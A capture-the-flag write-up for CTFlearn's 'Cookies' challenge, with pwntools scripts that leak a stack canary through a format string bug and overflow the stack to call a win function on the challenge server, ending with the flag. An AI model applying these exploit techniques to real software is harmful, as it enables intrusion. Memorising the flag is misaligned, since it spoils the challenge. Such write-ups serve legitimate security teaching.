# Cookies
> Write-up author: jon-brandy
## DESCRIPTION:
Cookies are not only present in browsers, we have them in C too!

nc rivit.dev 10015

## HINT:
- NONE
## STEPS:
1. In this binary we're given a 64 bit binary, dynamically linked, and not stripped.

```
┌──(brandy㉿bread-yolk)-[~/Downloads/ctflearn/cookies]
└─$ file task        
task: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ceb8ddab0789dd0067cc00b6ee2cd69cdee07e59, for GNU/Linux 3.2.0, not stripped
```

> BINARY PROTECTIONS

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/a381f906-b2d3-4dbf-824d-84de2c57e769)


2. Analyzing the source code given, the challenge is very straight-forward, it's a ret2win chall with canary.

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/5ee15d0b-7648-4db4-9840-d42a2c2606fc)


3. Since there's **FSB** hence we can leak the canary easier, no need to bruteforce it.
4. Let's create the fuzzing script.

> FUZZ SCRIPT

```py
from pwn import * 
import os 
os.system('clear')

exe = './task'
elf = context.binary = ELF(exe, checksec=True)
# context.log_level = 'DEBUG'
# context.log_level = 'INFO'
context.log_level = 'ERROR'

for i in range(100):
    sh = process(exe)
    sh.sendlineafter(b':', '%{}$p'.format(i))
    get = sh.recvuntil(b'Se')
    leak = get.split(b'Se')
    leaked_can = leak[0]
    print(str(i), ':', leaked_can)
```

> RESULT

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/d27e36e7-5e8d-4f6d-bef8-28b2599d278d)


5. The payload is kinda different from the basic ret2win, since there's canary the order is:

```
padding + canary + junk + stack_align (if needed) + win_sym
```

6. Noticed we can't get the correct offset using gdb cyclic pattern because there's canary! But, we can calculate it manually.
7. We know the input buffer is 16 bytes, at stack layout there's a RET address which holds 8 bytes (in 64 bit binary). Hence the correct padding is 24 bytes.
8. Then for the junk, it's easier to guess in a decompiler, but since we have the source code, we can calculate it manually!

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/2e988880-4c20-4128-aeb1-837c21c18639)


9. At the vuln function there's no other initialized data than our buffer. Hence the junk for canary should be **0x16 - 0x8** (64 bit binary).
10. Let's craft our script.

> FULL SCRIPT

```py
from pwn import * 
import os 
os.system('clear')

exe = './task'
elf = context.binary = ELF(exe, checksec=True)
# context.log_level = 'DEBUG'
context.log_level = 'INFO'
# context.log_level = 'ERROR'

# sh = remote('rivit.dev', 10015)
sh = process(exe)

sh.sendlineafter(b':', '%9$p')
get = sh.recvuntil(b'Se')
leak = get.split(b'Se')
leaked_can = leak[0]
leaked_can = int(leaked_can, 16)
success(f'CANARY --> {hex(leaked_can)}')

p = flat([
    asm('nop') * 0x18,
    leaked_can,
    b'A' * 0x8,
    elf.sym['print_flag']
])

sh.sendlineafter(b':', p)
sh.interactive()
```

> RESULT LOCALLY

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/1252b731-a6ae-4c2b-8ea2-32877e8374f2)


11. Great! Let's send it remotely!

> RESULT REMOTELY

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/61b9c48d-e3a6-4f74-bd13-69b8fdea2dd5)


12. We failed remotely, this should be because we need to add ret_gadget as a stack alignment.
13. You can use **ropper** or **ROPGadget** to grab it, but I used pwntools ROP.

> FINAL SCRIPT

```py
from pwn import * 
import os 
os.system('clear')

exe = './task'
elf = context.binary = ELF(exe, checksec=True)
# context.log_level = 'DEBUG'
context.log_level = 'INFO'
# context.log_level = 'ERROR'

sh = remote('rivit.dev', 10015)
# sh = process(exe)

sh.sendlineafter(b':', '%9$p')
get = sh.recvuntil(b'Se')
leak = get.split(b'Se')
leaked_can = leak[0]
leaked_can = int(leaked_can, 16)
success(f'CANARY --> {hex(leaked_can)}')

rop = ROP(elf)
ret = rop.find_gadget(['ret']).address
info(f'RET GADGET --> {hex(ret)}')
p = flat([
    asm('nop') * 0x18,
    leaked_can,
    b'A' * 0x8,
    ret,
    elf.sym['print_flag']
])

sh.sendlineafter(b':', p)
sh.interactive()
```

> RESULT

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/bbb6722d-ef32-42b4-9c4d-eb463cc0ea58)

14. Got the flag!

## FLAG

```
CTFlearn{d0_y0u_kn0w_why_s74ck_c00ki3_h4s_4_nu11_by73_1n_17?}
```
